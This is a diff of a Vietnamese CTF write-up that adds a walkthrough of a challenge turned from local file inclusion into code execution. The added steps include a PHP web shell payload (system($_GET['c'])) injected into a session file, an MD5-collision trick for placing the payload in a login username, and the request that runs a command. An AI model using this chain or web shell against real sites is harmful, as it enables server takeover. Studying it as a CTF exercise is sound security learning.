@@ -322,11 +322,69 @@ Mình sẽ theo hướng brute force vậy. Nhưng server Cookie han hoan toàn 
 
 Nhớ tại tên file flag sẽ có dạng như sau: `/flag****.txt`
 
-![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/dfb90fe7-3fd7-4fd2-9f84-0c91e1ccd0b1)
+Tiếp theo, cần phải LFI2RCE để biết được tên flag. Sau một hồi xem xét thì mình thấy có thể đọc được file session.
+`/admin.php?file=/tmp/sess_47795e92d21ec258b1788ee48cd1b568`
 
-Setup Intruder burpsuite như sau:
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/003d7ecf-1ab9-47c7-84a0-2df2d25bca4b)
 
-![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/0c35f184-0158-48a3-adc8-31dcbb2f61ea)
+Ý tưởng là sẽ khai thác LFI2RCE via PHP session
+
+tham khảo [tại đây](https://book.hacktricks.xyz/pentesting-web/file-inclusion/via-php_session_upload_progress)
+
+Mình từng đọc blog này trên facebook cũng nói về [vấn đề này](https://www.facebook.com/ExWareLabs/posts/php-lfi-to-rce-via-php-session-files-when-phpsessid-is-sethttpswwwrcesecuritycom/1683753655021835).
+
+Cũng giống như các lỗ hổng như php poisoing chẳng hạn, việc ghi log lại dữ liệu từ người dùng có thể nguy hiểm. Bạn có thể thấy có gì đó như username được ghi vào file session. Vì vậy cần phải thay đổi payload đăng nhập lúc trước sao cho nó vừa bypass được và vừa chứa mã php của mình.
+mã mình cần chèn: `<?php system($_GET['c']); ?>`
+
+Tham khảo cách php tạo session [tại đây]()
+
+Bây giờ mình cần tìm ra cách để chèn được payloaf vào username.
+```
+<?php
+
+$a = hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2');
+$b = hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2');
+        
+$c = b'hi';
+
+echo md5($a . $c);
+echo md5($b . $c);
+
+?>
+```
+Có thể thấy ở đây , việc thêm một string bất kì phía sau đoạn kia đều sẽ cho cùng một mã md5. Vì vậy mình sẽ tiến hành thêm payload vào vị trí này.
+
+Sửa lại chút mã:
+```
+<?php
+
+$a = hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2');
+$b = hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2');
+        
+$c = b'<?php system($_GET["c"])?>';
+echo base64_encode($a . $c);
+echo base64_encode($b . $c);
+?>
+```
+output:
+```
+Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+ojw/cGhwIHN5c3RlbSgkX0dFVFsiYyJdKT8+Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+ojw/cGhwIHN5c3RlbSgkX0dFVFsiYyJdKT8+
+```
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/24996445-7cdc-41a5-a945-fb120d145752)
+
+Kết quả thành công tạo một phiên rồi nhé.
+Session hiện tại là: `8dba22dcb0e9110a1fc48b0df2a155d1` => `/admin.php?file=/tmp/sess_8dba22dcb0e9110a1fc48b0df2a155d1`
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/b59c1dba-9672-4e09-9606-a483a82bc327)
+
+Mã php đã được chèn thành công
+
+Gọi tới `c=id` và thực thi thôi.
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/fd6d0fa9-5e9f-418d-8f84-37c2f6512c2e)
+
+Flag: `CHH{7yPE_jU66lin9_hArdEr_f57b45bccf1e2f6d2968b9d7da95c187}`
 
 
 ## Youtube Downloader
@@ -350,7 +408,6 @@ Ví dụ mình thử nhập một liên kết như sau:
 
 ![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/5bf1bbbf-2cf4-479c-b86f-77a7968631e4)
 Ứng dụng hiển thị thumbnail cùng với lệnh thực thi lên màn hình.
-
 
 ### Solution
 Vì mình đã từng làm một số thử thách liên quan tới công cụ youtube-dl rồi nền mình biết trong công cụ này có một số chức năng có thể dẫn tới `Chèn lệnh thực thi`.  🚡 Nhưng mình sẽ trình bày lại từ đầu như dưới đây.
@@ -803,3 +860,6 @@ oh. I got it 💯
 ![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/f22ed90f-c7b6-4d89-b1dd-6b0d34522725)
 
 😄 mình có flag và đề cương báo cáo của anh Long. 😄
+
+
+
